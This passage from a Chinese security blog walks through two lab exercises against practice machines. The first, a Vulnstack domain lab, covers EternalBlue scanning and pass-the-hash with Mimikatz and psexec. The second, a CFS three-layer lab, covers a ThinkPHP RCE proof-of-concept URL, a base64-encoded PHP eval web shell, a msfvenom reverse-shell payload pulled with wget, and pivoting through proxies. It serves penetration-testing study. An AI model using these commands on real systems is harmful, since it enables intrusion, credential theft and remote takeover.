+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.141</span><br><span class="line"><span class="built_in">set</span> ports 80,135-139,445,3306,3389</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316195846234-826611618.png"></p>
+<p>192.168.52.141 win2003域成员机开启了 135、139、445端口</p>
+<p>同理扫描一下域控机子 </p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316200115555-2063206.png"></p>
+<p>域控开启了80、135、139、445端口</p>
+<h2 id="2-MSF进行ms17-010攻击-未成功"><a href="#2-MSF进行ms17-010攻击-未成功" class="headerlink" title="(2)MSF进行ms17-010攻击(未成功)"></a>(2)MSF进行ms17-010攻击(未成功)</h2><h3 id="1、msf扫描模块探测是否存在ms17-010漏洞"><a href="#1、msf扫描模块探测是否存在ms17-010漏洞" class="headerlink" title="1、msf扫描模块探测是否存在ms17-010漏洞"></a>1、msf扫描模块探测是否存在ms17-010漏洞</h3><p>对于开启了 445 端口的 Windows 服务器肯定是要进行一波永恒之蓝扫描尝试的，借助 MSF 自带的漏洞扫描模块进行扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316201714462-967954062.png"></p>
+<p>一测 域控和成员机可能都存在ms17-010漏洞<br>2、漏洞利用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp <span class="comment">#内网环境，需要正向shell连接</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316202702006-1037964138.png"></p>
+<p>并没有拿到shell，看师傅的博客说好像通过 ms17-010直接拿到shell的情况并不多，成功率不高</p>
+<h2 id="3-哈希传递攻击-PTH-拿下域控"><a href="#3-哈希传递攻击-PTH-拿下域控" class="headerlink" title="(3) 哈希传递攻击(PTH)拿下域控"></a>(3) 哈希传递攻击(PTH)拿下域控</h2><p>上面既然通过永恒之蓝漏洞难以获得域控主机的 Shell，那就换一种攻击思路拿下域控吧，下面演示的是通过哈希传递攻击 PTH 拿下域控主机。</p>
+<p><strong>【哈希传递攻击】在 kerberos、NTLM 认证过程的关键，首先就是基于用户密码 Hash 的加密，所以在域渗透中，无法破解用户密码 Hash 的情况下，也可以直接利用 Hash 来完成认证，达到攻击的目的，这就是 hash 传递攻击（Pass The Hash，简称 PTH）。如果内网主机的本地管理员账户密码相同，那么可以通过 PTH 远程登录到任意一台主机，操作简单、威力无穷。</strong></p>
+<p>在域环境中，利用哈希传递攻击的渗透方式往往是这样的：</p>
+<ol>
+<li>获得一台域主机的权限，Dump 内存获得该主机的用户密码 Hash 值；</li>
+<li>通过哈希传递攻击尝试登录其他主机；</li>
+<li>继续搜集 Hash 并尝试远程登录，直到获得域管理员账户 Hash，登录域控，最终成功控制整个域。</li>
+</ol>
+<p>下面使用 Metasploit&#x2F;CS 来进行本靶场环境的进行 PTH 攻击演示：</p>
+<h3 id="1、CS哈希传递攻击利用"><a href="#1、CS哈希传递攻击利用" class="headerlink" title="1、CS哈希传递攻击利用"></a>1、CS哈希传递攻击利用</h3><p>前面我们也有提到过，在win7 上线CS时，我们可以右键会话 -&gt;执行 -&gt; Run Mimikatz<br>直接借助 CS 进行用户哈希凭证窃取</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317081913071-1261719240.png"></p>
+<p>这里抓取到用户哈希凭证之后，我们执行 net view 发现了域内另外俩台机器点击这里可以看到</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164731295-1003420215.png"></p>
+<p>可以利用抓取到的密码 psexec 利用域管理员账户 Hash login一下 监听器选 windows_smb&#x2F;bind_pipe</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164822903-1528659583.png"></p>
+<p>拿到正向会话(前面三层内网靶机有讲正向反向)之后，我们可以右键 目标-&gt;文件管理</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164517415-1798252375.png"></p>
+<p>可以看到域控的文件 我们可以进行上传文件操作，拿下域控</p>
+<h3 id="2、MSF哈希传递攻击"><a href="#2、MSF哈希传递攻击" class="headerlink" title="2、MSF哈希传递攻击"></a>2、MSF哈希传递攻击</h3><p><code>run windows/gather/smart_hashdump</code> 来进行hashdump</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316212756885-1839789078.png"></p>
+<p>需要SYSTEM权限，我们直接getsystem  发现可以正常提权<br>提到SYSTEM权限之后再执行 <code>run windows/gather/smart_hashdump</code></p>
+<p>得到管理员的密码的hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] 	liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+<p>但是这个只是用户密码的一个hash值，我们在msf里加载mimikatz模块<br>ps：ms6中 mimikatz模块已经合并为kiwi模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">creds_all  <span class="comment">#列举所有凭据</span></span><br><span class="line">creds_kerberos  <span class="comment">#列举所有kerberos凭据</span></span><br><span class="line">creds_msv  <span class="comment">#列举所有msv凭据</span></span><br><span class="line">creds_ssp  <span class="comment">#列举所有ssp凭据</span></span><br><span class="line">creds_tspkg  <span class="comment">#列举所有tspkg凭据</span></span><br><span class="line">creds_wdigest  <span class="comment">#列举所有wdigest凭据</span></span><br><span class="line">dcsync  <span class="comment">#通过DCSync检索用户帐户信息</span></span><br><span class="line">dcsync_ntlm  <span class="comment">#通过DCSync检索用户帐户NTLM散列、SID和RID</span></span><br><span class="line">golden_ticket_create  <span class="comment">#创建黄金票据</span></span><br><span class="line">kerberos_ticket_list  <span class="comment">#列举kerberos票据</span></span><br><span class="line">kerberos_ticket_purge  <span class="comment">#清除kerberos票据</span></span><br><span class="line">kerberos_ticket_use  <span class="comment">#使用kerberos票据</span></span><br><span class="line">kiwi_cmd  <span class="comment">#执行mimikatz的命令，后面接mimikatz.exe的命令</span></span><br><span class="line">lsa_dump_sam  <span class="comment">#dump出lsa的SAM</span></span><br><span class="line">lsa_dump_secrets  <span class="comment">#dump出lsa的密文</span></span><br><span class="line">password_change  <span class="comment">#修改密码</span></span><br><span class="line">wifi_list  <span class="comment">#列出当前用户的wifi配置文件</span></span><br><span class="line">wifi_list_shared  <span class="comment">#列出共享wifi配置文件/编码</span></span><br></pre></td></tr></table></figure>
+<p>抓取一下用户哈希凭证，报错说 mimikatz在x64用不了。。。 不知道怎么解决 卡住了</p>
+<p>后面第二天 CS秃然就可以用了(用着用着beacon就又exit了 不知道为啥) </p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317081913071-1261719240.png"></p>
+<p>获得 NTLM Hash：4f1a2b2cf1dd79ae22a7f198412d7e51，在 Metasploit 中，经常使用于哈希传递攻击的模块有：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/smb/psexec_command   <span class="comment">#在目标机器上执行系统命令</span></span><br><span class="line">exploit/windows/smb/psexec           <span class="comment">#用psexec执行系统命令</span></span><br><span class="line">exploit/windows/smb/psexec_psh       <span class="comment">#使用powershell作为payload</span></span><br></pre></td></tr></table></figure>
+
+<p>以exploit&#x2F;windows&#x2F;smb&#x2F;psexec模块哈希传递攻击 Windows Server 2008 为例：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.138</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass 00000000000000000000000000000000:4f1a2b2cf1dd79ae22a7f198412d7e51</span><br><span class="line"><span class="built_in">set</span> smbdomain god</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>但是 time out…… 没通<br>CS里通过 PTH  psexec成功拿下域控</p>
+<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317093025411-81491533.png"></p>
+<p>参考链接：<br><a href>https://blog.csdn.net/weixin_39190897&#x2F;article&#x2F;details&#x2F;118353886?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522167602673016800182163716%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id&#x3D;167602673016800182163716&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduend~default-2-118353886-null-null.142^v73^wechat,201^v4^add_ask,239^v1^insert_chatgpt&amp;utm_term&#x3D;%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA&amp;spm&#x3D;1018.2226.3001.4449</a></p>
+<p><a href>https://bwshen.blog.csdn.net/article/details/118338328</a></p>
+<p><a href>https://blog.csdn.net/qq_38626043&#x2F;article&#x2F;details&#x2F;109388147</a></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网靶场</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-CFS三层靶机-内网环境渗透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/" target="_blank">CFS三层靶机-内网环境渗透</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/" class="archive-article-date">
+        <time datetime="2023-09-20T10:23:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-09-20</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="靶场介绍及环境配置"><a href="#靶场介绍及环境配置" class="headerlink" title="&lt;1&gt;靶场介绍及环境配置"></a>&lt;1&gt;靶场介绍及环境配置</h1><p>三个主机的网络环境拓扑图，攻击机的网段在192.168.236.0&#x2F;24，三台靶机的IP地址分别如图：</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230209225152961-488534575.png"></p>
+<p>上面的 Target1、2、3分别对应CentOS7、Ubuntu、Windows7 三台主机。</p>
+<h2 id="1-网卡配置"><a href="#1-网卡配置" class="headerlink" title="(1)网卡配置"></a>(1)网卡配置</h2><p><strong>注意：</strong>在编辑虚拟网卡的时候，不要勾选红圈那个选项，否则后面代理就就没有意义了。.ova文件导入到VM之后可以打开虚拟机，使用root:teamssix.com登录主机，通过ifconfig检查网络情况是否正常。</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230131211728662-1333631746.png"></p>
+<h2 id="2-宝塔配置"><a href="#2-宝塔配置" class="headerlink" title="(2)宝塔配置"></a>(2)宝塔配置</h2><p>其中Target1和Target2主机需要我们自己去宝塔后台配置一下（靶机描述信息里有密码 root:teamssix.com）：<br>进入宝塔面板，选择网站，再点击网站名，将centos靶机中c段为236的那个ip添加进去，确保能够访问到对应的web页面</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230201000430993-611261632.png"></p>
+<h1 id="Target1"><a href="#Target1" class="headerlink" title="&lt;2&gt;Target1"></a>&lt;2&gt;Target1</h1><h2 id="1-nmap扫描存活主机"><a href="#1-nmap扫描存活主机" class="headerlink" title="(1)nmap扫描存活主机"></a>(1)nmap扫描存活主机</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#扫描段内存活主机</span></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -sP 192.168.236.0/24   </span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.236.141 (192.168.236.141)</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line"></span><br><span class="line"><span class="comment">#nmap扫描一下 Target1 开放的服务</span></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -A -p 1-65535 192.168.236.141</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.236.141 (192.168.236.141)</span><br><span class="line">Host is up (0.00082s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     Pure-FTPd</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    nginx</span><br><span class="line">111/tcp  open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">888/tcp  open  http    nginx</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    Ajenti http control panel</span><br><span class="line">MAC Address: 00:0C:29:61:BA:F8 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure>
+<p>可以看见开放了 21、22、80、111等等端口，我们访问一下80的http服务<br>访问192.168.236.141 站点不存在，192.168.236.141&#x2F;index.php 404  是因为宝塔后台配置的原因，按照前面提到的宝塔配置之后就不会出现这个情况。</p>
+<h2 id="2-利用thinkphp-5-0-22-RCE漏洞拿shell"><a href="#2-利用thinkphp-5-0-22-RCE漏洞拿shell" class="headerlink" title="(2)利用thinkphp-5.0.22 RCE漏洞拿shell"></a>(2)利用thinkphp-5.0.22 RCE漏洞拿shell</h2><p>访问80端口开放的http服务<br><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230201001424258-1611965800.png"></p>
+<p>访问后发现这是一个用thinkphp5版本搭建的网站，thinkphp5版本是有漏洞的，这里我们直接上thinkphpGUI工具，检测一下，发现存在ThinkPHP 5.0.22&#x2F;5.1.29 RCE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc为：http://192.168.236.141/index.php/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230201001757626-1027791401.png"></p>
+<p>直接GetShell没通，无伤大雅，那我们执行命令去生成一个一句话木🐎(执行反弹shell命令也可)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[&#x27;1vxyz&#x27;]); ?&gt;&quot;</span> &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>但是蚁剑连接失败，查看一下shell.php  发现内容中$_POST被过滤了</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230201002507800-1694852472.png"></p>
+<p>这个好说，base64加密绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbJzF2eHl6J10pOyA/Pg==&quot;</span> | base64 -d &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230201003035718-721769135.png"></p>
+<p>成功写入一句话木🐎，蚁剑连接<br>在 flag21sA.txt和robots.txt 得到了两个flag</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230201003245541-1585024473.png"></p>
+<p>拿到shell之后，执行ifconfig，发现了另一个22网段ip：192.168.22.130。肯定就存在内网了</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230201003451768-1866845677.png"></p>
+<h2 id="3-上传msf后门-reverse-tcp-反向连接拿主机权限"><a href="#3-上传msf后门-reverse-tcp-反向连接拿主机权限" class="headerlink" title="(3)上传msf后门(reverse_tcp)反向连接拿主机权限"></a>(3)上传msf后门(reverse_tcp)反向连接拿主机权限</h2><p>既然存在内网，那就要拿出来我们的msf美少妇工具了<br>首先利用 msfevnom 生成一个msf后门，即elf的🐎</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成msf后门  其中lhost为kali_ip</span></span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.236.128 lport=4444 -f elf &gt; shell.elf</span><br><span class="line"><span class="comment">#kali里python开一个http服务  用于蚁剑 wget下载 msf后门</span></span><br><span class="line">python -m http.server 8888</span><br><span class="line"><span class="comment"># 蚁剑进入到可以下载文件的 /tmp目录</span></span><br><span class="line">wget http://192.168.236.128:8888/shell.elf</span><br><span class="line"><span class="comment"># 赋予执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x shell.elf</span><br><span class="line"><span class="comment">#在kali中运行监听模块</span></span><br><span class="line">root@kali:~<span class="comment"># msfconsole</span></span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.236.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line"><span class="comment">#然后回到蚁剑 /tmp下 ./执行 elf木马</span></span><br><span class="line">./shell.elf</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230207170319140-1881247987.png"></p>
+<p>到这里我们的Target1：centos靶机已经上线 msf 了，下面开始内网渗透</p>
+<h1 id="Target2"><a href="#Target2" class="headerlink" title="&lt;3&gt;Target2"></a>&lt;3&gt;Target2</h1><p>现在还不能直接去nmap扫描内网里的ubuntu靶机ip，因为我们的网段设置，这里扫描是用的kali的ip扫描，模拟的环境中kali和centos是NAT下的同一个网段的公网主机，所以可以直接扫到，而现在扫的属于内网网段。 但是我们知道刚打下的centos是内网里的，因此我们需要挂上centos靶机的代理。</p>
+<h2 id="1-路由信息探测"><a href="#1-路由信息探测" class="headerlink" title="(1)路由信息探测"></a>(1)路由信息探测</h2><p>我们使用msf自带的 <strong>探测网络接口的模块</strong>（get_local_subnets）<strong>查看路由的模块</strong>(autoroute -p)来进一步进行信息探测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取本地所在子网信息，可以看到存在22网段</span></span><br><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: 192.168.22.0/255.255.255.0</span><br><span class="line">Local subnet: 192.168.236.0/255.255.255.0</span><br><span class="line"><span class="comment"># 查看路由信息，会发现还没有路由</span></span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line">[*] No routes have been added yet</span><br></pre></td></tr></table></figure>
+<p><strong>路由：</strong>路由是指路由器从一个接口上收到数据包，根据数据包的目的地址进行定向并转发到另一个接口的过程，就相当于把我们要传输的数据先传输到该路由，再发往目标，我们可以通过设置路由的方式把我们的请求从centos网段发出，这样msf不就可以与22网段互通有无了吗），所以我们要来添加一个路由(autoroute -s)</p>
+<p><strong>静态路由配置</strong></p>
+<p>MSF 的 autoroute 模块是 MSF 框架中自带的一个路由转发功能，实现过程是 MSF 框架在已经获取的 Meterpreter Shell 的基础上添加一条去往“内网”的路由，直接使用 MSF 去访问原本不能直接访问的内网资源，只要路由可达我们既可使用 MSF 来进行探测了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#通过meterpreter添加22网段的路由信息，这样kali与centos就可以互通了</span></span><br><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line"><span class="comment">#这一步也可以使用run post/multi/manage/autoroute自动添加路由</span></span><br><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
+<h2 id="2-msf的代理配置"><a href="#2-msf的代理配置" class="headerlink" title="(2)msf的代理配置"></a>(2)msf的代理配置</h2><p>路由还有一个缺陷，它只能在这个msf建立的会话上使用，假如我们新开一个终端使用nmap扫描，还是扫不到，所以我们需要去进行 msf的代理配置。</p>
+<p>msf有自己的代理模块，就是 auxiliary&#x2F;server&#x2F;socks_proxy  ，我们先来开启代理服务，srvport端口随便，没被占用就行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先切到控制台</span></span><br><span class="line">background</span><br><span class="line"><span class="comment"># 配置socks5代理</span></span><br><span class="line">msf6 &gt; use auxiliary/server/socks_proxy</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; show options</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; <span class="built_in">set</span> srvport 2222</span><br><span class="line">msf6 auxiliary(server/socks_proxy) &gt; run</span><br></pre></td></tr></table></figure>
+<p>在kali中，通过vim &#x2F;etc&#x2F;proxychains4.conf修改proxychains配置文件：</p>
+<p><img src="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/3074366-20230207174250688-1858802378.png"></p>
+<p>写入：  kali的ip和刚刚设置的端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 192.168.236.128 2222</span><br></pre></td></tr></table></figure>
+<p>扫描靶机2 ubuntu的ip及其服务</p>
+<p>可以用nmap扫描存活主机，也可以利用msf进行第二层网络存活主机扫描：</p>
